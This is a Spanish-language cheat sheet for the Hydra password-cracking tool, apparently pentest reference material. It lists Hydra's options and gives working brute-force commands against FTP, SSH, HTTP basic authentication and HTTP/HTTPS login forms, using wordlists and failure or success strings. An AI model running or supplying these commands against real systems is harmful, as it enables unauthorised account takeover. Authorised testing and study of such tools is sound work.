### Opciones:

- -s {port} -> Si el servicio está en un puerto diferente por default
- -l -> Especificar un usuario
- -L {userfile} -> Leer de un archivo listado de usuarios
- -p -> Especificar un password
- -P {passwordfile} -> Leer de un archivo listado de passwords
- -f -> Detener el ataque al encontrar una coincidencia
- -t {#tasks} -> Número de conexiones en paralelo por objetivo
- -M {targetsfile} -> Leer de un archivo listado de objetivos
- -o {file} -> Guardar el resultado de un archivo
- -vV -> Modo verbose, mostrando el inicio de sesión + contraseña para cada intento
### Conocer los tipos de servicios que se puedan atacar:
$ hydra -h | grep "Supported services" | tr ":" "\n" | tr " " "\n" | column -e
## Ejemplos:
### Cracking con Brute Force en FTP Server:
$ hydra -t 1 -l admin -P {PASSWORD.txt} -vV {IP-ADDRESS} > ftp
### Cracking con Brute Force en SSH Server:
$ hydra -l msfadmin -P {PASSWORD.txt} -vV {IP-ADDRESS} > ssh
### Fuerza bruta usando una wordlist para usuarios y otra para contraseñas e intentar que pase la la contraseña en cada usuario de la lista:
$ hydra -L {USER.txt} -P {PASSWORD.txt} -u -f {IP-ADDRESS} -s {PORT} http-get
### Cracking con Brute Force a un formulario de inicio de sesión por HTTPS (La data de POST esta separada con el ':') y usando un mensaje de password incorrecto:
$ $ hydra -l none -P {PASSWORD.txt} -f {IP-ADDRESS} https-post-form "/db/index.php:password=^PASS^&login=Log+In&proc_login=true:F=Incorrect password" -t 64
### Fuerza bruta a un formulario de inicio de sesión por HTTP donde al ingresar una contraseña mal regresa al mismo formulario y eso usarlo como mensaje incorrecto:
$ hydra -l admin -P {PASSWORD.txt} -f {IP-ADDRESS} -s {PORT} http-post-form "/login.php:username=^USER^&password=^PASS^:F=`<form name='login'`"
### Fuerza bruta a un formulario de inicio de sesión por HTTP donde al ingresar una contraseña correcta manda un mensaje:
$ hydra -l admin -P {PASSWORD.txt} -f {IP-ADDRESS} -s {PORT} http-post-form "/:username=^USER^&password=^PASS^:S=Dashboard"
### Ataque de Fuerza Bruta a una Authenticacion Básica que se encuentra en un directorio web:
$ hydra -l admin -P {PASSWORD.txt} -s {PORT} -f {IP-ADDRESS} http-get /{DIRECTORY}
### Cracking con Brute Force en WEB Login Server, enviando 'usuario:password':
$ hydra -C {WORDLIST-WITH-COLON-SEPARATED-FORMAT} {IP-ADDRESS} https-post-form "/login.php:username=^USER^&password=^PASS^:F=login failed"